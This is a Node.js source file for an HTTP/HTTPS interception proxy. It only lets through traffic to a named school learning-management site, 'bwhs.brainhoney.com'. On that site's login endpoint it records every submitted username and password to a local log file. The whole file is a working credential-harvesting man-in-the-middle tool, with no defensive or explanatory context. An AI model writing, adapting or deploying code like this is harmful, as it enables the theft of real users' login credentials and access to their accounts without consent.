var http = require('http'),
    https = require('https'),
    fs = require('fs'),
    handler = require(__dirname + '/lib.js'),
    upgrade = require(__dirname + '/upgrade.js'),
    logger = require(__dirname + '/log.js');

var filter = function(req, res, parsed_req, cont) {
  if( parsed_req.host == 'bwhs.brainhoney.com' ) {
    if( parsed_req.path == '/Controls/CredentialsUI.ashx' ) {
      logger(req, './log.txt', function(body) {
	return body.username+'    '+body.password;
      });
    }
    cont();
  } else {
    res.write("Permission Denied");
    res.end();
  }
};

https.createServer({
  key: fs.readFileSync('certs/key.pem'),
  cert: fs.readFileSync('certs/cert.pem')
}, handler(https, filter, function(req) {
  req.url = 'https://' + req.headers['host'] + req.url;
  return req;
})).listen(8081);

http.createServer(handler(http, filter)).on('upgrade', function(req, socket, head) {
  upgrade(socket, 'localhost', 8081);
}).listen(8080);

